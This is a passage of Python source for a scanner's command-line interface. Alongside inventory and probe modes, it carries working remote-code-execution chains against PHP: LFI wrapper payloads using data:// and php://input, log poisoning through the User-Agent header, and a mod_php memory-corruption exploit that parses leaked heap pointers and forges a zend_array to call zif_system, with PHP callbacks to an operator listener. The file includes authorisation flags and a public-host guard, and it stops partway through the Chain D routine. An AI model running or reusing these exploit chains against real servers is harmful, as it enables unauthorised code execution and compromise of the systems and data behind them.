"""Command line interface for the evidence-first scanner.

Modes:
  inventory  build/package/SAPI inventory, GET requests only
  probe      low-impact frontend -> PHP reachability probes
  prove      explicit, bounded scenario execution (requires --ack-authorised)
  exploit    destructive chain with out-of-band callback verification
  auto       discover prerequisites and try all viable chains automatically
  report     rebuild findings from stored evidence, no network
  verify     verify evidence artefact hashes
"""

from __future__ import annotations

import argparse
import ipaddress
import json
import os
import re
import socket
import sys
import time
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlsplit

from .assess import assess_all, assess_exploit
from .discover import run_discovery
from .evidence import RunStore
from .exploit import (
    MAX_ATTEMPTS,
    ExploitBudget,
    ExploitOptions,
    run_exploit,
    _build_callback_php,
    _exec_snippet,
    _shell_literal,
    _pick_exec_functions,
)
from .listener import CallbackListener
from .http import HttpClient
from .inventory import InventoryOptions, collect
from .models import CaseFile, Finding, ScenarioRun, TargetProfile
from .probe import run_probe
from .prove import ProveEngine, ProveLimits, ProveOptions
from .report import build_document, write_reports
from .scenarios import SCENARIOS, scenario_list, select
from .util import new_id, new_nonce, slugify, utcnow
from .version import CVE_618, CVE_619, VERSION

PROOF_STATUSES = {
    "AFFECTED_PATH_CONFIRMED",
    "PRODUCER_CONSUMER_CORRELATED",
    "STALE_STATE_CONFIRMED",
    "CODE_EXECUTION_CONFIRMED",
}


def _abort(message: str) -> None:
    """Report a bad invocation and exit with the documented usage-error code."""
    print(f"error: {message}", file=sys.stderr)
    raise SystemExit(2)


def _parse_headers(values: Optional[List[str]]) -> Dict[str, str]:
    headers: Dict[str, str] = {}
    for value in values or []:
        if ":" not in value:
            _abort(f"invalid --header (expected 'Name: value'): {value!r}")
        name, val = value.split(":", 1)
        name, val = name.strip(), val.strip()
        if not name or any(ch in name + val for ch in ("\r", "\n", "\x00")):
            _abort(f"unsafe --header value: {value!r}")
        headers[name] = val
    return headers


def _default_out(mode: str, target: str) -> str:
    return os.path.join("runs", f"{slugify(target)}-{mode}-{new_id('run')[-8:]}")


def _client(args: argparse.Namespace) -> HttpClient:
    return HttpClient(
        base_url=args.target.rstrip("/") + "/",
        timeout=args.timeout,
        insecure=args.insecure,
        max_body=args.max_body,
        ca_file=args.ca_file,
        extra_headers=_parse_headers(args.header),
        proxy=args.proxy,
        host_header=args.host_header,
        follow_redirects=not args.no_redirects,
    )


def _inventory_options(args: argparse.Namespace) -> InventoryOptions:
    return InventoryOptions(
        inventory_json=args.inventory_json,
        php_binary=args.php_binary,
        status_url=args.status_url,
        sapi=args.sapi,
        environment_kind=args.environment_kind,
        synthetic=bool(getattr(args, "synthetic_fixture", False)),
        insecure=args.insecure,
        timeout=args.timeout,
        extra_headers=_parse_headers(args.header),
        ca_file=args.ca_file,
        proxy=args.proxy,
    )


def _case(
    run_id: str,
    profile: TargetProfile,
    evidence: List[Any],
    runs: List[ScenarioRun],
    mode: str,
    environment: Dict[str, Any],
) -> CaseFile:
    return CaseFile(
        profile=profile,
        evidence=evidence,
        scenario_runs=runs,
        run_id=run_id,
        tool_version=VERSION,
        mode=mode,
        started_at=environment.get("started_at", utcnow()),
        finished_at=utcnow(),
        environment=environment,
    )


def _existing_runs(store: RunStore) -> List[ScenarioRun]:
    """Preserve scenario runs when a run directory is reused across modes."""
    if not os.path.exists(store.case_path):
        return []
    try:
        return list(store.read_case().scenario_runs)
    except (OSError, ValueError, KeyError):
        return []


def _merge_runs(
    existing: List[ScenarioRun], new: List[ScenarioRun]
) -> List[ScenarioRun]:
    """Deduplicate by scenario id, preferring an executed run over a skip."""
    merged: Dict[str, ScenarioRun] = {}
    order: List[str] = []
    for run in existing + new:
        if run.scenario_id not in merged:
            merged[run.scenario_id] = run
            order.append(run.scenario_id)
            continue
        if run.executed:
            # An explicit rerun (--allow-rerun) replaces the earlier executed
            # run in the case view; the earlier evidence remains append-only.
            merged[run.scenario_id] = run
    return [merged[scenario_id] for scenario_id in order]


def _finalise(
    store: RunStore,
    case: CaseFile,
    findings: List[Finding],
    outdir: str,
    print_json: bool,
    exploit_result=None,
    exploit_assessment=None,
    exploit_confirmed: bool = False,
) -> int:
    errors = case.validate()
    for finding in findings:
        errors.extend(finding.validate())
    store.write_case(case)
    store.write_findings(findings)
    verification_errors = store.verify() + errors
    doc = build_document(case, findings, verification_errors)
    paths = write_reports(outdir, doc, findings)
    payload = {
        "target": case.profile.target,
        "run_id": case.run_id,
        "mode": case.mode,
        "verdicts": {
            finding.cve: {
                "status": finding.status,
                "reason": finding.status_reason,
                "missing_evidence": finding.missing_evidence,
            }
            for finding in findings
        },
        "out": outdir,
        "files": paths,
        "integrity_ok": not verification_errors,
        "validation_errors": errors,
    }
    if exploit_result is not None:
        payload["exploit"] = exploit_result.to_dict()
    if exploit_assessment is not None:
        payload["exploit_assessment"] = exploit_assessment
    if print_json:
        print(json.dumps(payload, indent=2, ensure_ascii=False))
    else:
        print()
        print(f"target : {case.profile.target}")
        print(f"run    : {case.run_id}")
        for finding in findings:
            print(f"  {finding.cve}  {finding.status:32s} {finding.status_reason}")
        print(f"files  : {outdir}")
        if errors:
            print("validation errors:")
            for error in errors:
                print(f"  - {error}")
    if errors:
        return 2
    if exploit_confirmed or any(f.status in PROOF_STATUSES for f in findings):
        return 1
    return 0


def _run_inventory_or_probe(args: argparse.Namespace, mode: str) -> int:
    if mode == "inventory" and args.all:
        # --all is explicitly not a prove switch; for inventory it is a no-op.
        pass
    outdir = args.out or _default_out(mode, args.target)
    run_id = os.path.basename(outdir.rstrip("/\\"))
    store = RunStore(outdir, run_id, args.target, mode, VERSION)
    previous_runs = _existing_runs(store)
    client = _client(args)
    profile = collect(
        args.target,
        client,
        _inventory_options(args),
        store=store,
        run_id=run_id,
    )
    probe_result = None
    if mode == "probe":
        probe_result = run_probe(
            client,
            profile,
            store,
            status_url=args.status_url,
            timeout=args.probe_timeout,
            synthetic=bool(args.synthetic_fixture),
        )
    environment = {
        "kind": args.environment_kind,
        "synthetic": bool(args.synthetic_fixture),
        "telemetry_files": list(args.telemetry or []),
        "probe": probe_result.to_dict() if probe_result else None,
        "limits": None,
        "started_at": utcnow(),
    }
    case = _case(
        run_id, profile, store.load_evidence(), previous_runs, mode, environment
    )
    findings = assess_all(case)
    return _finalise(store, case, findings, outdir, args.json)


def _run_prove(args: argparse.Namespace) -> int:
    if args.all:
        _abort("--all never enables prove mode; pass explicit --scenario ids")
    if not args.scenario:
        _abort("prove requires at least one --scenario (for example --scenario 618-S2)")
    if not args.ack_authorised:
        _abort(
            "prove requires --ack-authorised: written authorisation for the internal "
            "target and a prepared telemetry/health channel"
        )
    scenarios = select(args.scenario)
    limits = ProveLimits(
        max_requests=args.max_requests,
        max_bytes=args.max_bytes,
        max_request_bytes=args.max_request_bytes,
        timeout=args.probe_timeout,
        health_timeout=args.timeout,
        max_seconds=args.max_seconds,
        concurrency=args.concurrency,
        stop_on_degradation=True,
    )
    options = ProveOptions(
        scenarios=scenarios,
        acknowledge_authorised=True,
        health_url=args.health_url,
        status_url=args.status_url,
        telemetry_files=list(args.telemetry or []),
        telemetry_source=args.telemetry_source,
        producer_url=args.producer_url,
        consumer_url=args.consumer_url,
        app_oom_endpoint=args.app_oom_endpoint,
        app_oom_field=args.app_oom_field,
        app_oom_mib=args.app_oom_mib,
        canary_readback_url=args.canary_readback_url,
        allow_rerun=args.allow_rerun,
        allow_non_advisory_sapi=args.allow_non_advisory_sapi,
        environment_kind="fixture" if args.synthetic_fixture else "lab",
        synthetic=bool(args.synthetic_fixture),
        limits=limits,
    )
    outdir = args.out or _default_out("prove", args.target)
    run_id = os.path.basename(outdir.rstrip("/\\"))
    store = RunStore(outdir, run_id, args.target, "prove", VERSION)
    previous_runs = _existing_runs(store)
    client = _client(args)
    profile = collect(
        args.target,
        client,
        _inventory_options(args),
        store=store,
        run_id=run_id,
    )
    probe_result = run_probe(
        client,
        profile,
        store,
        status_url=args.status_url,
        timeout=args.probe_timeout,
        synthetic=bool(args.synthetic_fixture),
    )
    engine = ProveEngine(client, store, profile, options, existing_runs=previous_runs)
    outcome = engine.run()
    environment = {
        "kind": "fixture" if args.synthetic_fixture else "lab",
        "synthetic": bool(args.synthetic_fixture),
        "telemetry_files": list(args.telemetry or []),
        "probe": probe_result.to_dict(),
        "limits": limits.to_dict(),
        "prove": outcome.to_dict(),
        "started_at": outcome.started_at,
        "stopped_reason": outcome.stopped_reason,
        "interrupted": outcome.interrupted,
    }
    all_runs = _merge_runs(previous_runs, outcome.runs)
    case = _case(run_id, profile, store.load_evidence(), all_runs, "prove", environment)
    findings = assess_all(case)
    return _finalise(store, case, findings, outdir, args.json)


def _public_host(host: str) -> bool:
    """True when any resolved address is globally routable."""
    try:
        infos = socket.getaddrinfo(host, None, type=socket.SOCK_STREAM)
    except OSError:
        return False
    for info in infos:
        try:
            address = ipaddress.ip_address(str(info[4][0]))
        except ValueError:
            continue
        if getattr(address, "ipv4_mapped", None):
            address = address.ipv4_mapped
        if address.is_global and not address.is_private:
            return True
    return False


def _ingest_telemetry(
    store: RunStore,
    files: List[str],
    source: Optional[str],
    scenario_id: str,
    synthetic: bool,
) -> List[str]:
    from .telemetry import parse_telemetry_file, source_for_path

    refs: List[str] = []
    for path in files:
        events, errors = parse_telemetry_file(
            path, source or source_for_path(path)
        )
        for error in errors:
            store.add(
                "operator",
                {"parse_error": error, "file": path},
                scenario_id=scenario_id,
                trust="low",
                notes="telemetry parse error",
                synthetic=synthetic,
            )
        for event in events:
            item = store.add_telemetry(
                event,
                scenario_id=scenario_id,
                synthetic=synthetic,
                trust="high" if event.source == "lab_trace" else "medium",
            )
            refs.append(item.id)
    return refs


def _run_exploit(args: argparse.Namespace) -> int:
    if not args.ack_authorised:
        _abort(
            "exploit requires --ack-authorised: this sends actual exploit payloads to the target"
        )
    if args.proxy:
        _abort(
            "exploit mode uses raw sockets and does not support --proxy; "
            "remove --proxy or use inventory/probe for proxied observation"
        )
    target_host = urlsplit(args.target).hostname or ""
    if not args.allow_remote and _public_host(target_host):
        _abort(
            f"refusing to send exploit payloads to public host {target_host!r}; "
            "use --allow-remote only with explicit written authorisation"
        )
    if args.host_header and any(
        ch in args.host_header for ch in ("\r", "\n", "\x00")
    ):
        _abort("unsafe --host-header value")
    if args.chain in ("A", "C") and not args.lfi_path:
        _abort(
            f"chain {args.chain} requires --lfi-path (for example '/page.php?page=')"
        )
    if args.chain == "D":
        profiles = _load_chain_d_profiles(getattr(args, "chain_d_offsets", None))
        if not profiles:
            _abort("chain D requires offset profiles; provide --chain-d-offsets or ensure data/chain_d_offsets.json exists")
    if args.chain == "B" and not args.gadget:
        _abort(
            "chain B requires --gadget with an application-specific serialised "
            "POP chain; the scanner does not ship one"
        )
    if args.canary_nonce and not re.fullmatch(
        r"P2S[A-Z0-9]{6,64}", args.canary_nonce
    ):
        _abort(
            "--canary-nonce must match P2S[A-Z0-9]{6,64}; it is embedded in the "
            "operator's gadget so the callback can be correlated"
        )
    if args.canary_nonce and args.chain != "B":
        _abort("--canary-nonce is only used by chain B; it would not be embedded")
    if args.canary_nonce and args.callback_port is None:
        _abort("--canary-nonce requires --callback-port; without the scanner's "
               "listener the callback cannot be verified")
    if args.chain == "C" and args.callback_port is None:
        _abort(
            "chain C requires --callback-port: without a listener it cannot "
            "verify RCE"
        )
    if args.max_requests < 1:
        _abort("--max-requests must be at least 1")
    if args.max_bytes < 1024:
        _abort("--max-bytes must be at least 1024")
    if args.max_seconds <= 0:
        _abort("--max-seconds must be greater than 0")
    outdir = args.out or _default_out("exploit", args.target)
    run_id = os.path.basename(outdir.rstrip("/\\"))
    store = RunStore(outdir, run_id, args.target, "exploit", VERSION)
    previous_runs = _existing_runs(store)
    client = _client(args)
    profile = collect(
        args.target,
        client,
        _inventory_options(args),
        store=store,
        run_id=run_id,
    )
    probe_result = run_probe(
        client, profile, store,
        status_url=args.status_url,
        timeout=args.probe_timeout,
        synthetic=bool(args.synthetic_fixture),
    )

    budget = ExploitBudget(
        max_requests=args.max_requests,
        max_bytes=args.max_bytes,
        max_seconds=args.max_seconds,
        started_at=time.monotonic(),
    )
    options = ExploitOptions(
        chain=args.chain,
        cve=args.cve,
        lfi_path=args.lfi_path,
        session_path=args.session_path,
        inject_path=args.inject_path,
        trigger_path=args.trigger_path,
        command=args.command,
        exec_func=args.exec_func,
        gadget=args.gadget,
        canary_nonce=args.canary_nonce,
        callback_port=args.callback_port,
        callback_bind=args.callback_bind,
        callback_ip=args.callback_ip,
        callback_expect=list(args.callback_expect or []),
        attempts=args.attempts,
        timeout=args.timeout,
        race_delay=args.race_delay,
        acknowledge_authorised=True,
        environment_kind=args.environment_kind,
        synthetic=bool(args.synthetic_fixture),
        insecure=args.insecure,
        ca_file=args.ca_file,
        extra_headers=_parse_headers(args.header),
        host_header=args.host_header,
        max_body=args.max_body,
        health_url=args.health_url,
        budget=budget,
    )
    if args.chain == "D":
        from .exploit import ExploitResult
        canary = new_nonce("P2SEXPL")
        listener = None
        if args.callback_port is not None:
            try:
                listener = CallbackListener(
                    port=args.callback_port,
                    bind=args.callback_bind,
                    callback_ip=args.callback_ip,
                    expected_sources=list(args.callback_expect or []),
                )
                listener.start()
            except Exception:
                listener = None
        dr = _try_chain_d_rce(
            client, profile, store,
            args.command, listener, canary, args.timeout,
            chain_d_offsets_path=getattr(args, "chain_d_offsets", None),
        )
        if listener:
            listener.stop()
        exploit_result = ExploitResult(
            chain="D",
            cve=args.cve or CVE_618,
            scenario_id="chain-d-exploit",
            success=dr["success"],
            rce_confirmed=dr["success"],
            command_output=dr.get("output"),
            callback_received=dr["callback_received"],
            notes=dr["notes"],
            request_refs=dr.get("request_refs", []),
            started_at=utcnow(),
            finished_at=utcnow(),
            budget=budget.to_dict(),
        )
    else:
        exploit_result = run_exploit(client, profile, store, options)

    runs: List[ScenarioRun] = []
    if exploit_result.scenario_run is not None:
        telemetry_refs = _ingest_telemetry(
            store,
            list(args.telemetry or []),
            args.telemetry_source,
            exploit_result.scenario_id,
            bool(args.synthetic_fixture),
        )
        if telemetry_refs:
            exploit_result.scenario_run.telemetry_refs.extend(telemetry_refs)
        runs.append(exploit_result.scenario_run)

    environment = {
        "kind": args.environment_kind,
        "synthetic": bool(args.synthetic_fixture),
        "telemetry_files": list(args.telemetry or []),
        "probe": probe_result.to_dict(),
        "exploit": exploit_result.to_dict(),
        "limits": budget.to_dict(),
        "started_at": exploit_result.started_at or utcnow(),
        "degraded": exploit_result.degraded,
    }
    case = _case(
        run_id, profile, store.load_evidence(),
        _merge_runs(previous_runs, runs), "exploit", environment,
    )
    findings = assess_all(case)
    assessment = assess_exploit(case)
    case.environment["exploit_assessment"] = assessment
    rc = _finalise(
        store, case, findings, outdir, args.json,
        exploit_result=exploit_result,
        exploit_assessment=assessment,
        exploit_confirmed=bool(assessment.get("confirmed")),
    )

    if not args.json:
        print()
        if assessment.get("confirmed"):
            print(f"  [RCE OBSERVED] chain {exploit_result.chain}")
            print(f"  attribution : {assessment.get('attribution')} "
                  f"(callback proves execution, not which CVE path)")
            print(f"  evidence    : {', '.join(assessment.get('evidence_refs') or [])}")
            if exploit_result.callback:
                print(f"  callback    : {exploit_result.callback.get('remote_addr', '?')}")
            if exploit_result.command_output:
                print(f"  command out :")
                for line in exploit_result.command_output.strip().splitlines():
                    print(f"    | {line}")
        elif exploit_result.command_output:
            print(f"  [UNVERIFIED OUTPUT] chain {exploit_result.chain}")
            print(f"  note        : output was captured from the response body but "
                  "no callback confirmed RCE")
            print(f"  command out :")
            for line in exploit_result.command_output.strip().splitlines():
                print(f"    | {line}")
        else:
            print(f"  [NOT CONFIRMED] chain {exploit_result.chain}")
        for note in exploit_result.notes:
            print(f"  - {note}")
        for err in exploit_result.errors:
            print(f"  ! {err}")
        print(f"  budget      : {budget.requests}/{budget.max_requests} requests, "
              f"{budget.bytes}/{budget.max_bytes} bytes, {budget.elapsed():.1f}s")
        if exploit_result.degraded:
            print("  ! target health degraded after the chain")

    if exploit_result.errors and not assessment.get("confirmed"):
        return 2
    return rc


def _try_wrapper_rce(
    client: HttpClient,
    profile: TargetProfile,
    store: RunStore,
    lfi_endpoint: Any,
    wrapper_type: str,
    command: str,
    exec_func: Optional[str],
    listener: Optional[Any],
    canary_nonce: str,
    timeout: float = 10.0,
) -> Dict[str, Any]:
    """Try direct RCE via data:// or php://input wrapper through an LFI.

    Returns a dict with 'success', 'output', 'callback_received', 'notes'.
    """
    from .discover import _safe_get, _safe_post, DiscoverBudget, _body_text
    result: Dict[str, Any] = {
        "success": False, "output": None, "callback_received": False,
        "notes": [], "request_refs": [],
    }
    budget = DiscoverBudget(max_requests=20)

    exec_funcs = _pick_exec_functions(exec_func)
    for func in exec_funcs[:3]:
        cmd_escaped = _shell_literal(command)
        exec_code = _exec_snippet(cmd_escaped, func)

        if listener:
            callback_url = listener.callback_url(canary_nonce)
            callback_code = _build_callback_php(callback_url)
            php_code = f"<?php {exec_code}echo '___START___'.($o??'').'___END___';{callback_code}?>"
        else:
            php_code = f"<?php {exec_code}echo '___START___'.($o??'').'___END___';?>"

        if wrapper_type == "data":
            import base64
            b64 = base64.b64encode(php_code.encode()).decode()
            payload_path = f"data://text/plain;base64,{b64}"
            include_url = lfi_endpoint.build_include_url(payload_path)
            pair = _safe_get(
                client, include_url, store, budget,
                scenario_id="auto-wrapper-rce",
                timeout=timeout,
                notes=f"wrapper RCE via data:// ({func})",
            )
        elif wrapper_type == "php_input":
            from urllib.parse import quote as _quote
            parsed = urlsplit(lfi_endpoint.url)
            include_url = f"{lfi_endpoint.url}?{lfi_endpoint.param}={_quote('php://input', safe='')}"
            pair = _safe_post(
                client, include_url, php_code.encode(),
                "application/x-www-form-urlencoded",
                store, budget,
                scenario_id="auto-wrapper-rce",
                timeout=timeout,
                notes=f"wrapper RCE via php://input ({func})",
            )
        else:
            break

        if pair is None:
            result["notes"].append(f"wrapper {wrapper_type}:// request failed ({func})")
            continue

        exchange, item = pair
        result["request_refs"].append(item.id)
        body = _body_text(exchange)

        if "___START___" in body and "___END___" in body:
            start = body.index("___START___") + len("___START___")
            end = body.index("___END___")
            output = body[start:end]
            if output and "<?php" not in output:
                result["output"] = output
                result["notes"].append(f"command output via {wrapper_type}:// ({func})")
                if listener:
                    cb = listener.wait_for_callback(canary_nonce, timeout=5.0)
                    if cb:
                        result["callback_received"] = True
                        result["success"] = True
                        result["notes"].append("callback confirmed RCE")
                return result
            else:
                result["notes"].append(f"markers reflected (not executed) via {func}")
                continue

    return result


def _try_log_poison_rce(
    client: HttpClient,
    profile: TargetProfile,
    store: RunStore,
    lfi_endpoint: Any,
    log_path: str,
    command: str,
    exec_func: Optional[str],
    listener: Optional[Any],
    canary_nonce: str,
    timeout: float = 10.0,
) -> Dict[str, Any]:
    """Try RCE via log poisoning: inject PHP in User-Agent, then include log."""
    from .discover import _safe_get, DiscoverBudget, _body_text
    result: Dict[str, Any] = {
        "success": False, "output": None, "callback_received": False,
        "notes": [], "request_refs": [],
    }
    budget = DiscoverBudget(max_requests=20)

    exec_funcs = _pick_exec_functions(exec_func)
    for func in exec_funcs[:3]:
        cmd_escaped = _shell_literal(command)
        exec_code = _exec_snippet(cmd_escaped, func)

        if listener:
            callback_url = listener.callback_url(canary_nonce)
            callback_code = _build_callback_php(callback_url)
            php_code = f"<?php {exec_code}echo '___START___'.($o??'').'___END___';{callback_code}?>"
        else:
            php_code = f"<?php {exec_code}echo '___START___'.($o??'').'___END___';?>"

        _safe_get(
            client, profile.base_url, store, budget,
            scenario_id="auto-log-poison-inject",
            timeout=timeout,
            notes=f"log poison inject ({func})",
            extra_headers={"User-Agent": php_code},
        )

        include_url = lfi_endpoint.build_include_url(log_path)
        pair = _safe_get(
            client, include_url, store, budget,
            scenario_id="auto-log-poison-trigger",
            timeout=timeout,
            notes=f"log poison trigger via {log_path} ({func})",
        )
        if pair is None:
            result["notes"].append(f"log include failed ({func})")
            continue

        exchange, item = pair
        result["request_refs"].append(item.id)
        body = _body_text(exchange)

        if "___START___" in body and "___END___" in body:
            start = body.index("___START___") + len("___START___")
            end = body.index("___END___")
            output = body[start:end]
            if output and "<?php" not in output:
                result["output"] = output
                result["notes"].append(f"command output via log poisoning ({func})")
                if listener:
                    cb = listener.wait_for_callback(canary_nonce, timeout=5.0)
                    if cb:
                        result["callback_received"] = True
                        result["success"] = True
                        result["notes"].append("callback confirmed RCE")
                return result
            else:
                result["notes"].append(f"markers reflected via log ({func})")
                continue

    return result


# ---------------------------------------------------------------------------
# Chain D: pure OOM mod_php exploit (no LFI required)
# ---------------------------------------------------------------------------

_BUNDLED_OFFSETS = os.path.join(os.path.dirname(__file__), os.pardir, "data", "chain_d_offsets.json")


def _load_chain_d_profiles(custom_path: Optional[str] = None) -> Dict[str, Dict[str, int]]:
    """Load Chain D offset profiles from JSON (custom file or bundled default)."""
    path = custom_path or _BUNDLED_OFFSETS
    path = os.path.normpath(path)
    if not os.path.isfile(path):
        return {}
    with open(path) as f:
        data = json.load(f)
    profiles: Dict[str, Dict[str, int]] = {}
    for key, offsets in data.get("profiles", {}).items():
        profiles[key] = {
            k: int(v, 16) if isinstance(v, str) else v
            for k, v in offsets.items()
        }
    return profiles


def _parse_heap_leak(raw_cookie: bytes) -> Optional[Dict[str, Any]]:
    """Parse leaked heap data from a PHPSESSID Set-Cookie.

    After OOM + dangling PS(id), the session cookie contains raw heap bytes.
    We scan for pointers in the 0x7f... range (x86_64) or use alignment heuristics.

    Returns dict with 'libphp_base', 'main_chunk_base', 'zval_ptr_dtor_addr',
    or None if parsing fails.
    """
    if len(raw_cookie) < 64:
        return None

    from collections import Counter

    ptrs: List[int] = []
    for off in range(0, len(raw_cookie) - 7, 8):
        val = int.from_bytes(raw_cookie[off:off + 8], "little")
        if 0x7f0000000000 <= val <= 0x7fffffffffff:
            ptrs.append(val)
        elif 0x0000aaaa00000000 <= val <= 0x0000ffffffffffff:
            ptrs.append(val)

    if len(ptrs) < 5:
        return None

    bases_2m = Counter(p & ~0x1FFFFF for p in ptrs)
    if not bases_2m:
        return None

    sorted_bases = bases_2m.most_common()
    libphp_base_2m = sorted_bases[0][0]
    libphp_count = sorted_bases[0][1]

    libphp_ptrs = Counter(
        p for p in ptrs if (p & ~0x1FFFFF) == libphp_base_2m
    )
    zval_ptr_dtor_addr = libphp_ptrs.most_common(1)[0][0]

    # Adaptive main chunk detection: second-largest cluster that isn't libphp
    main_chunk_base = None
    if len(sorted_bases) >= 2:
        for base, count in sorted_bases[1:]:
            if count >= 10 and abs(base - libphp_base_2m) > 0x200000:
                main_chunk_base = base
                break

    # Fallback: try 4MiB alignment grouping
    if main_chunk_base is None and len(sorted_bases) >= 2:
        bases_4m = Counter(p & ~0x3FFFFF for p in ptrs)
        for base, count in bases_4m.most_common():
            if base != (libphp_base_2m & ~0x3FFFFF) and count >= 8:
                main_chunk_base = base
                break

    return {
        "zval_ptr_dtor_addr": zval_ptr_dtor_addr,
        "libphp_base": zval_ptr_dtor_addr & ~0x1FFFFF,
        "main_chunk_base": main_chunk_base,
        "pointer_count": len(ptrs),
        "unique_bases": len(bases_2m),
        "libphp_cluster_count": libphp_count,
        "arch_hint": "aarch64" if any(
            0x0000aaaa00000000 <= p <= 0x0000ffffffffffff for p in ptrs[:10]
        ) else "x86_64",
    }


def _djbx33a(data: bytes) -> int:
    """PHP's DJBX33A hash (zend_inline_hash_func)."""
    h = 5381
    for b in data:
        h = ((h * 33) + b) & 0xFFFFFFFFFFFFFFFF
    return h


def _build_chain_d_payload(
    command: str,
    profile_offsets: Dict[str, int],
    libphp_base: int,
    main_chunk_base: int,
) -> bytes:
    """Build the B2 payload: fake zend_array + refcount spray that
    redirects pDestructor → zif_system with our command string.
    """
    import struct

    zif_system = libphp_base + profile_offsets["zif_system"]
    fake_array_off = profile_offsets["fake_array_S"]
    hsv_off = profile_offsets["hsv"]

    fake_array_addr = main_chunk_base + fake_array_off
    hsv_addr = main_chunk_base + hsv_off

    # Build fake zend_array (HashTable) structure:
    # - gc.refcount=2, gc.u.type_info = IS_ARRAY (7) | collectable flag
    # - nTableMask = -2  (one bucket)
    # - arData → points to a fake Bucket we place after
    # - nNumUsed = 1, nNumOfElements = 1
    # - nTableSize = 2
    # - pDestructor → zif_system
    cmd_bytes = command.encode("utf-8") + b"\x00"

    ht = bytearray(56)
    # gc: refcount=2, type=7 (IS_ARRAY), flags with GC_COLLECTABLE
    struct.pack_into("<I", ht, 0, 2)           # refcount
    struct.pack_into("<I", ht, 4, 0x10 | 7)    # type_info: IS_ARRAY | collectable
    # nTableMask
    struct.pack_into("<I", ht, 8, 0xFFFFFFFE)  # -2 as uint32
    # arData pointer (we place the Bucket right after the HashTable)
    fake_bucket_addr = fake_array_addr + 56
    struct.pack_into("<Q", ht, 16, fake_bucket_addr)
    # nNumUsed, nNumOfElements
    struct.pack_into("<I", ht, 24, 1)
    struct.pack_into("<I", ht, 28, 1)
    # nTableSize
    struct.pack_into("<I", ht, 32, 2)
    # nInternalPointer
    struct.pack_into("<I", ht, 36, 0)
    # nNextFreeElement
    struct.pack_into("<q", ht, 40, 1)
    # pDestructor → zif_system
    struct.pack_into("<Q", ht, 48, zif_system)

    # Fake Bucket: val is a zval with type=IS_STRING, value points to our command
    bucket = bytearray(32)
    cmd_str_addr = fake_bucket_addr + 32
    struct.pack_into("<Q", bucket, 0, cmd_str_addr)  # zval.value.str
    struct.pack_into("<I", bucket, 8, 6)              # type = IS_STRING
    struct.pack_into("<I", bucket, 12, 0)             # type_flags
    struct.pack_into("<Q", bucket, 16, 0)             # h (hash)
    struct.pack_into("<Q", bucket, 24, 0)             # key = NULL (numeric)

    # Fake zend_string for the command
    zstr = bytearray(24 + len(cmd_bytes))
    struct.pack_into("<I", zstr, 0, 1)                # gc.refcount
    struct.pack_into("<I", zstr, 4, 6)                # type_info: IS_STRING
    struct.pack_into("<Q", zstr, 8, _djbx33a(cmd_bytes[:-1]))  # h (PHP hash)
    struct.pack_into("<Q", zstr, 16, len(cmd_bytes) - 1)  # len (without NUL)
    zstr[24:24 + len(cmd_bytes)] = cmd_bytes

    return bytes(ht) + bytes(bucket) + bytes(zstr)


def _try_chain_d_rce(
    client: HttpClient,
    profile: TargetProfile,
    store: RunStore,
    command: str,
    listener: Optional[Any],
    canary_nonce: str,
    timeout: float = 30.0,
    workers: int = 5,
    chain_d_offsets_path: Optional[str] = None,
    max_attempts: int = 3,
) -> Dict[str, Any]:
    """Try Chain D: pure OOM exploitation on mod_php (no LFI needed).

    Flow: A1 (OOM) → B1 (heap leak) → A2 (cheap OOM) → B2 (RCE payload).
    Retries the full A1→B2 sequence up to max_attempts times with
    escalating heap spray intensity on each retry.
    """
    from .discover import (
        build_oom_probe_body, build_oom_lite_body,
        hold_workers, release_workers, _body_text,
        DiscoverBudget, _safe_get,
    )
    from .classifier import classify

    result: Dict[str, Any] = {
        "success": False, "output": None, "callback_received": False,
        "notes": [], "request_refs": [], "leak_info": None,
    }

    parsed_url = urlsplit(profile.base_url)
    host = parsed_url.hostname or "127.0.0.1"
    port = parsed_url.port or 80
    boundary = "C" * 10

    # --- Rank candidate offset profiles (best match first) ---
    chain_d_profiles = _load_chain_d_profiles(chain_d_offsets_path)
    php_version = getattr(profile, "php_version", None)
    sapi_hint = getattr(profile, "sapi", None)

    # Detect distro from build_metadata or Server header
    distro_hint = None
    build_meta = getattr(profile, "build_metadata", {}) or {}
    if build_meta.get("distro"):
        distro_hint = build_meta["distro"]
    packaging = getattr(profile, "packaging", None)
    if not distro_hint and packaging:
        for d in ("trixie", "bookworm", "bullseye", "buster", "alpine"):
            if d in packaging.lower():
                distro_hint = d
                break

    candidates: List[Tuple[str, Dict[str, int], str]] = []
    seen_keys: set = set()
    partial = ".".join(php_version.split(".")[:2]) if php_version else None

    # Tier 1: exact version + sapi + distro match
    if distro_hint:
        for key, offs in chain_d_profiles.items():
            if (php_version and php_version in key
                    and sapi_hint and sapi_hint in key
                    and distro_hint in key):
                candidates.append((key, offs, "exact+distro"))
                seen_keys.add(key)

    # Tier 2: exact version + sapi match
    for key, offs in chain_d_profiles.items():
        if (key not in seen_keys and php_version and php_version in key
                and sapi_hint and sapi_hint in key):
            candidates.append((key, offs, "exact"))
            seen_keys.add(key)

    # Tier 3: exact version, any sapi (prefer distro match)
    for key, offs in chain_d_profiles.items():
        if key not in seen_keys and php_version and php_version in key:
            tier = "version+distro" if distro_hint and distro_hint in key else "version"
            candidates.append((key, offs, tier))
            seen_keys.add(key)

    # Tier 4: major.minor match (prefer distro match)
    if partial:
        for key, offs in chain_d_profiles.items():
            if key not in seen_keys and partial in key:
                tier = "partial+distro" if distro_hint and distro_hint in key else "partial"
                candidates.append((key, offs, tier))
                seen_keys.add(key)

    # Tier 5: any x86_64 profile as last resort
    for key, offs in chain_d_profiles.items():
        if key not in seen_keys and "x86_64" in key:
            candidates.append((key, offs, "arch-fallback"))
            seen_keys.add(key)

    if not candidates:
        result["notes"].append("no matching offset profile found")
        return result

    result["notes"].append(
        f"found {len(candidates)} candidate profile(s): "
        + ", ".join(f"{k} ({t})" for k, _, t in candidates[:5])
    )

    # --- Pin workers ---
    holders: List[socket.socket] = []
    try:
        holders = hold_workers(host, port, workers, timeout=10.0)
        if len(holders) < max(1, workers - 2):
            result["notes"].append(f"only pinned {len(holders)}/{workers - 1} workers")
    except Exception as e:
        result["notes"].append(f"worker pinning failed: {e}")

    # Heap spray parameters escalate on each retry
    SPRAY_CONFIGS = [
        {"parts": 100, "depth": 16, "pad_blocks": 30, "pad_size": 8000},
        {"parts": 200, "depth": 24, "pad_blocks": 50, "pad_size": 12000},
        {"parts": 400, "depth": 32, "pad_blocks": 80, "pad_size": 16000},
    ]

    # Total attempts = max_attempts per candidate, cycling through profiles
